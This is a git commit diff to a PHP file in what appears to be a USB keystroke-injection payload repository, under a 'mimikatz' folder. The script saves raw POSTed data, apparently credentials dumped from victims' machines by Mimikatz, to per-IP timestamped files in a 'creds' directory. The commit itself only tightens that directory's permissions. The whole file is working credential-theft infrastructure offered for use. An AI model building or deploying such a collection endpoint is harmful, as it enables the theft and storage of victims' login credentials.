798da16b36f0d53e4a33d94c59e5a861626a3c0a
illwill <illwill@illmob.org>
2019-01-05 01:30:48 -0500

    Update index.php

--- Ducky_Payloads/mimikatz/index.php
+++ Ducky_Payloads/mimikatz/index.php
@@ -1,7 +1,7 @@
 <?php
 // check for existance of ./creds dir, make if not and set perms open
 $cdir = getcwd() . "/creds/";
-if (!file_exists($cdir)) {mkdir($cdir, 0777, true);}
+if (!file_exists($cdir)) {mkdir($cdir, 0755, true);}
 // get credentials and stow to file
 $file = $cdir . $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".creds";
 file_put_contents($file, file_get_contents("php://input"));
